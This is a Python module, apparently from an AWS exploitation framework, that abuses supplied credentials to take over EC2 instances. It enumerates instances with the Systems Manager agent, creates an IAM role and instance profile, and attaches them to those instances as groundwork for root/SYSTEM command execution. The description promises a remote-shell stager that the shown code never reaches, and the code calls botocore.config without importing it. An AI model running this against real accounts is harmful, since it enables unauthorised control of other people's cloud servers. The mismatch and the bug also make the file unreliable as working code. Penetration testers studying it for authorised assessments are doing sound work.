#!/usr/bin/env python3
import boto3
import argparse
import os
import re
from botocore.exceptions import ClientError

module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'sysman_ec2_rce',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Tries to execute code as root/SYSTEM on EC2 instances.',

    # Full description about what the module does and how it works
    'description': 'This module tries to execute arbitrary code on EC2 instances as root/SYSTEM using EC2 Systems Manager. To do so, it will first try to enumerate EC2 instances that are running operating systems that have the Systems Manager agent installed by default. Then, it will attempt to find the Systems Manager IAM instance profile, or try to create it if it can\'t find it. If successful, it will try to attach it to the instances enumerated earlier. Then it will use EC2 Run Command to execute arbitrary code on the EC2 instances as either root (Linux) or SYSTEM (Windows). By default, this module will execute a PacuProxy stager on the host to give you remote shell access, as well as a PacuProxy agent to route commands through.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['EC2'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['enum_ec2'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': [],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])


def help():
    return [module_info, parser.format_help()]


def main(args, pacu_main):
    session = pacu_main.get_active_session()
    proxy_settings = pacu_main.get_proxy_settings()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    key_info = pacu_main.key_info
    fetch_data = pacu_main.fetch_data
    get_regions = pacu_main.get_regions
    ######

    if fetch_data(['EC2', 'Instances'], 'enum_ec2', '--instances') is False:
        print('Pre-req module not run successfully. Exiting...')
        return
    instances = session.EC2['Instances']

    instance_profile = dict()

    # Images
    try:
        client = boto3.client(
            'ec2',
            region_name='us-east-1',
            aws_access_key_id=session.access_key_id,
            aws_secret_access_key=session.secret_access_key,
            aws_session_token=session.session_token,
            config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
        )
        dryrun = client.describe_images(
            DryRun=True
        )
    except ClientError as error:
        if not str(error).find('UnauthorizedOperation') == -1:
            print('Dry run failed, the current AWS account does not have the necessary permissions to run "describe_images". Operating system enumeration is no longer trivial.\n')

    regions = get_regions('EC2')

    os_with_default_ssm_agent = [
        '[\s\S]*Windows[\s\S]*Server[\s\S]*2016[\s\S]*',
        '[\s\S]*Amazon[\s\S]*Linux[\s\S]*',
        '[\s\S]*Ubuntu[\s\S]*Server[\s\S]*18\\.04[\s\S]*LTS[\s\S]*'
        #'Windows Server 2003-2012 R2 released after November 2016'
    ]

    # Begin enumeration of vulnerable images
    vuln_images = []
    for region in regions:
        image_ids = []
        print('Starting region {}...\n'.format(region))
        client = boto3.client(
            'ec2',
            region_name=region,
            aws_access_key_id=session.access_key_id,
            aws_secret_access_key=session.secret_access_key,
            aws_session_token=session.session_token,
            config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
        )

        for instance in instances:
            if instance['Region'] == region:
                image_ids.append(instance['ImageId'])

        # Describe all images being used in the environment
        if image_ids == []:
            print('  No images found.\n')
        else:
            images = client.describe_images(
                ImageIds=list(set(image_ids))
            )['Images']

            # Iterate images and determine if they are possibly one of the operating systems with SSM agent installed by default
            count = 0
            for image in images:
                os_details = '{} {} {}'.format(image['Description'], image['ImageLocation'], image['Name'])
                for vuln_os in os_with_default_ssm_agent:
                    result = re.match(r'{}'.format(vuln_os), os_details)
                    if result is not None:
                        count += 1
                        vuln_images.append(image['ImageId'])
                        break
            print('  {} vulnerable images found.\n'.format(count))
    print('Total vulnerable images found: {}\n'.format(len(vuln_images)))
    
    client = boto3.client(
        'iam',
        aws_access_key_id=session.access_key_id,
        aws_secret_access_key=session.secret_access_key,
        aws_session_token=session.session_token,
        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
    )

    # Begin Systems Manager role finder/creator
    ssm_policy = client.get_policy(
        PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
    )['Policy']

    ssm_role_name = ''
    if ssm_policy['AttachmentCount'] > 0:
        if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles') is False:
            print('Pre-req module not run successfully. Exiting...')
            return
        roles = session.IAM['Roles']

        # For each role that exists in the account
        for role in roles:
            # For each AssumeRole statement
            for statement in role['AssumeRolePolicyDocument']['Statement']:
                # Statement->Principal could be a liist or a dict
                if type(statement['Principal']) is list:
                    # For each item in the list, check if ec2.amazonaws.com is in it
                    for principal in statement['Principal']:
                        if 'ec2.amazonaws.com' in principal:
                            attached_policies = client.list_attached_role_policies(
                                RoleName=role['RoleName'],
                                PathPrefix='/service-role/'
                            )['AttachedPolicies']
                            # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
                            for policy in attached_policies:
                                if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
                                    ssm_role_name = role['RoleName']
                                    break
                            if not ssm_role_name == '':
                                break
                    if not ssm_role_name == '':
                        break
                elif type(statement['Principal']) is dict:
                    # For each key in the dict, check if it equal ec2.amazonaws.com
                    for key in statement['Principal']:
                        if statement['Principal'][key] == 'ec2.amazonaws.com':
                            attached_policies = client.list_attached_role_policies(
                                RoleName=role['RoleName'],
                                PathPrefix='/service-role/'
                            )['AttachedPolicies']
                            # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
                            for policy in attached_policies:
                                if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
                                    ssm_role_name = role['RoleName']
                                    break
                            if not ssm_role_name == '':
                                break
                    if not ssm_role_name == '':
                        break
            if not ssm_role_name == '':
                break
    if ssm_role_name == '':
        print('Did not find valid EC2 SystemsManager service role (which means there is no instance profile either). Trying to create one now...\n')
        try:
            # Create the SSM role
            create_response = client.create_role(
                RoleName='SSM',
                AssumeRolePolicyDocument='{"Version": "2012-10-17", "Statement": [{"Sid": "", "Effect": "Allow", "Principal": {"Service": "ec2.amazonaws.com"}, "Action": "sts:AssumeRole"}]}'
            )['Role']

            ssm_role_name = create_response['RoleName']

            # Attach the SSM policy to the role just created
            attach_response = client.attach_role_policy(
                RoleName=ssm_role_name,
                PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
            )
            print('  Successfully created the required role: {}\n'.format(create_response['Arn']))
        except Exception as error:
            print('  Unable to create the required role: {}\n'.format(str(error)))
            return
    else:
        print('Found valid SystemsManager service role: {}. Checking if it is associated with an instance profile...'.format(ssm_role_name))

        # Find instance profile belonging to that role
        response = client.list_instance_profiles_for_role(
            RoleName=ssm_role_name,
            MaxItems=1
        )

        if len(response['InstanceProfiles']) > 0:
            instance_profile = response['InstanceProfiles'][0]
            print('Found valid instance profile: {}.'.format(instance_profile['InstanceProfileName']))
        # Else, leave instance_profile == dict()

    # If no instance profile yet, create one with the role we have
    if instance_profile == {}:
        # There is no instance profile yet
        try:
            # Create a new instance profile
            instance_profile = client.create_instance_profile(
                InstanceProfileName='SSM'
            )['InstanceProfile']

            # Attach our role to the new instance profile
            client.add_role_to_instance_profile(
                InstanceProfileName=instance_profile['InstanceProfileName'],
                RoleName=ssm_role_name
            )
        except Exception as error:
            print('  Unable to create an instance profile: {}\n'.format(str(error)))
            return

    client = boto3.client(
        'ec2',
        aws_access_key_id=session.access_key_id,
        aws_secret_access_key=session.secret_access_key,
        aws_session_token=session.session_token,
        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
    )

    # Start attaching the instance profile to the vulnerable instances
    for region in regions:
        for instance in instances:
            if instance['Region'] == region:
                if instance['ImageId'] in vuln_images:
                    if 'IamInstanceProfile' in instance:
                        # If we need to replace the current instance profile to do this
                        # For now, skipping this as it could be harmful to an environment
                        pass
                    else:
                        # There is no instance profile attached yet, do it now
                        response = client.associate_iam_instance_profile(
                            IamInstanceProfile={
                                'Name': instance_profile['InstanceProfileName'],
                                'Arn': instance_profile['Arn']
                            },
                            InstanceId=instance['InstanceId']
                        )

    print('{} completed.'.format(os.path.basename(__file__)))
    return
